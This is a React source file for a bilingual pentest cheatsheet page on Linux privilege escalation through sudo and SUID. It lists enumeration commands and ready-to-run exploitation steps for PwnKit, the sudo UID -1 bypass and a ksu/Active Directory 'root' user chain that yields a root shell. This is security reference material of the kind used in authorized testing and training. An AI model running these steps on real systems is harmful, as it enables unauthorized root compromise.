"use client";

import { useLanguage } from "@/components/LanguageProvider";
import { CheatsheetCommandCard } from "@/components/CheatsheetCommandCard";

export default function LinuxSudoSuidPage() {
  const { lang } = useLanguage();
  const entries = [
    { cmd: "sudo -l", why: lang === "fr" ? "Identifier les commandes sudo exécutables sans mot de passe." : "Identify sudo commands executable without password." },
    { cmd: "find / -perm -4000 -type f 2>/dev/null", why: lang === "fr" ? "Lister les binaires SUID exploitables." : "List potentially exploitable SUID binaries." },
    { cmd: "nxc ssh $TARGET -u $USER -p $PASS -x 'sudo -l'", why: lang === "fr" ? "Collecte distante sudoers via SSH validé." : "Collect remote sudoers data through validated SSH access." },
    { cmd: "nxc ssh $TARGET -u $USER -p $PASS -x 'id && whoami && hostname'", why: lang === "fr" ? "Contexte identité avant tentative d'escalade." : "Identity context before escalation attempt." },
    { cmd: "pkexec --version # policykit-1 < 0.105-33 = vulnérable", why: lang === "fr" ? "PwnKit (CVE-2021-4034) : pkexec est SUID par défaut sur la quasi-totalité des distros, root direct sans mot de passe si la version est vulnérable." : "PwnKit (CVE-2021-4034): pkexec is SUID by default on almost every distro, direct root without a password if the version is vulnerable." },
    { cmd: "gcc pwnkit.c -o pwnkit_exploit && ./pwnkit_exploit  # PoC arthepsy", why: lang === "fr" ? "Exploitation PwnKit : dépose un binaire SUID (ex: /tmp/rootbash) exploitable ensuite avec -p." : "PwnKit exploitation: drops a SUID binary (e.g. /tmp/rootbash) usable afterwards with -p." },
    { cmd: "sudo -u#-1 /bin/bash", why: lang === "fr" ? "CVE-2019-14287 (sudo < 1.8.28) : une règle sudoers (ALL, !root) est contournable, l'UID -1 (ou 4294967295) est mal interprété et exécute en root malgré l'exclusion explicite." : "CVE-2019-14287 (sudo < 1.8.28): a sudoers rule (ALL, !root) can be bypassed, UID -1 (or 4294967295) is mishandled and runs as root despite the explicit exclusion." },
    { cmd: "ls -la /usr/bin/ksu.mit  # -rwsr-xr-x root root", why: lang === "fr" ? "CVE-2025-11561 : sur un hôte Linux joint à l'AD (SSSD) avec ksu (MIT Kerberos) en SUID, l'autorisation fait un fallback par correspondance de NOM entre le principal Kerberos et l'utilisateur cible. Un principal AD littéralement nommé 'root' est alors autorisé à devenir l'utilisateur local root." : "CVE-2025-11561: on an AD-joined Linux host (SSSD) with ksu (MIT Kerberos) SUID, authorization falls back to matching the Kerberos principal NAME against the target user. An AD principal literally named 'root' is then authorized to become the local root user." },
    { cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add user root '$PASS' --ou '$OU_AVEC_CREATE_CHILD'", why: lang === "fr" ? "Si on a CREATE_CHILD sur une OU quelconque, créer un utilisateur AD nommé 'root' suffit à armer l'exploit : kinit root@DOMAIN puis ksu root -n root@DOMAIN donne un shell root local. Piège : ksu -e <cmd> échoue souvent (cmd_path restreint) — lancer le shell interactif et envoyer les commandes sur stdin." : "If we have CREATE_CHILD on any OU, creating an AD user named 'root' is enough to arm the exploit: kinit root@DOMAIN then ksu root -n root@DOMAIN gives a local root shell. Gotcha: ksu -e <cmd> often fails (restricted cmd_path) — launch the interactive shell and send commands over stdin instead." },
  ];

  return (
    <div className="mx-auto max-w-3xl px-6 py-10 lg:px-10">
      <header className="mb-8 border-b border-border pb-6">
        <p className="mb-2 text-[11px] font-mono uppercase tracking-widest text-primary">Privesc Linux</p>
        <h1 className="text-2xl font-semibold tracking-tight text-foreground sm:text-3xl">Sudo / SUID</h1>
      </header>
      <section className="space-y-4">
        {entries.map((item) => <CheatsheetCommandCard key={item.cmd} cmd={item.cmd} why={item.why} lang={lang} />)}
      </section>
    </div>
  );
}
